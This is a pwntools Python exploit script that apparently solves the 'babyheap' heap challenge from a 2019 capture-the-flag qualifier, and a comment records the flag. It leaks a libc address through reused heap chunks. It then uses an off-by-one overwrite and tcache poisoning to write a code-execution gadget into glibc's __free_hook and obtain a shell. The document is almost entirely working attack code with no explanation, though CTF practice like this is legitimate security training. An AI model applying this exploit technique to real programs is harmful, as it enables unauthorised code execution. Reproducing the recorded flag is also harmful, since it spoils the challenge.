from pwn import *
import time

debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("babyheap.quals2019.oooverflow.io", 5000)
  libcz = ELF("./libc.so")
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  mainz = ELF("./babyheap")
  r = mainz.process()
  #gdb.attach(r, """source ./script.py""") #some breakpoint etc..?

def halt():
  while True:
    log.info( r.recvline() )

def malloc(size, data):
  r.recvuntil(">")
  r.sendline("M")
  r.recvuntil(">")
  r.sendline(str(size))
  r.recvuntil(">")
  r.sendline( data )

def malloc_2(size, data):
  r.recvuntil(">")
  r.sendline("M")
  r.recvuntil(">")
  r.sendline(str(size))
  r.recvuntil(">")
  r.sendline( data[:-2] )

def free(index):
  r.recvuntil(">")
  r.sendline("F")
  r.recvuntil(">")
  r.sendline(str(index))

def show(index):
  r.recvuntil(">")
  r.sendline("S")
  r.recvuntil(">")
  r.sendline(str(index))

def giveup():
  r.recvuntil(">")
  r.sendline("E")

def interactive(): #some issue with terminal and gdb so instead this
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit(): 
 for _ in range(10):
  malloc(0xf7, "A"*1)  #if size less equals to 0xf8 than malloc of same size... otherwise malloc(0x178)

 for x in range(9):
   free(x)

 for x in range(7):
   malloc(0xf7, "A"*1) 
 
 malloc(0x100, "leak123:") 
 show(7)
 r.recvuntil("leak123:")
 leak_1=u64( (r.recvline().rstrip()).ljust(8,"\x00"))
 log.info("leak arena addr 0x%x" % leak_1)

 libc_base = leak_1 - 0x1e4c40 + 0x21db0  - 0x22000
 if online:
   libc_base= leak_1 - 0x1e4c40 + 0x21db0 - 0x22000
 log.info("libc baseaddr  0x%x" % libc_base)

 for x in range(7):
   free(x)
 
 system = libc_base  + 0x106ef8
 if online:
   system = libc_base  + 0x106ef8
 free_hook = libc_base + 0x00000000001e75a8
 if online:
   free_hook = libc_base + 0x00000000001e75a8
 
 log.info("system addr  0x%x" % system)
 log.info("free hook addr  0x%x" % free_hook)

 #malloc(0x178, "A"*0x179) #off-by one
 #malloc(0x181, "A"*0x178 + p64(free_hook))
 free(7)
 free(9)
 #now all si freed

 for _ in range( 7 ): #index: 6
   malloc(0xf7, "A"*1)

 malloc(0xf7, "A"*0xf7) #7
 malloc(0xf7, "A"*0xf7) #8
 malloc(0xf7, "B"*0xf7) #9

 for x in range( 8):
   free(x)

 for x in range( 7):
   malloc(0x7f, "ok")
 
 for x in range( 7):
   free(x)

 malloc(0xf8, "A"*0xf8 + "\x81") #0
 malloc(0xf8, "A"*0xf8 ) #1
 free(1)
 malloc_2(0x170, "A"*0x100 + p64(free_hook)) #1

 malloc(0x170, "A"*0x150) #2
 malloc(0xf8, "A"*0xf8) #3
 malloc_2(0xf8, p64(system)) #4
 interactive() #free something and cat the flag
 #OOO{4_b4byh34p_h45_nOOO_n4m3}
 return

exploit()
